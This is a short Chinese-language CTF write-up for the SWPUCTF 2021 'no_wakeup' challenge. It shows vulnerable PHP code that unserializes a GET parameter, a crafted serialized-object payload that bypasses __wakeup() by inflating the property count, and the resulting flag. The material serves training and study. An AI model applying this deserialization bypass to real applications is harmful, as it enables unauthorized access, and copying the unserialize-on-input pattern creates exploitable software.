---
title: '[SWPUCTF 2021 新生赛]no_wakeup'
date: '2025-05-26T20:55:18+08:00'
weight: 
draft: false
description: '[SWPUCTF 2021 新生赛]no_wakeup'
---

题目代码：

```php
<?php

header("Content-type:text/html;charset=utf-8");
error_reporting(0);
show_source("class.php");

class HaHaHa{


        public $admin;
        public $passwd;

        public function __construct(){
            $this->admin ="user";
            $this->passwd = "123456";
        }

        public function __wakeup(){
            $this->passwd = sha1($this->passwd);
        }

        public function __destruct(){
            if($this->admin === "admin" && $this->passwd === "wllm"){
                include("flag.php");
                echo $flag;
            }else{
                echo $this->passwd;
                echo "No wake up";
            }
        }
    }

$Letmeseesee = $_GET['p'];
unserialize($Letmeseesee);

?>
```

构造 payload：`O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}`

```php
<?php
class HaHaHa{
    public $admin;
    public $passwd;
}

$hahaha = new HaHaHa();
$hahaha->admin = "admin";
$hahaha->passwd = "wllm";
echo serialize($hahaha);
```

注意到 `__wakeup()` 函数在序列化时会对 `$passwd` 进行 `sha1()` 哈希化（`$this->passwd = sha1($this->passwd);`），**当对象属性的个数大于真实属性的个数时可以绕过 `__wakeup()`**，所以修改 payload 为 `O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}`

得到 flag：NSSCTF{29521992-bf99-49b9-bf0a-cb20a3c92231}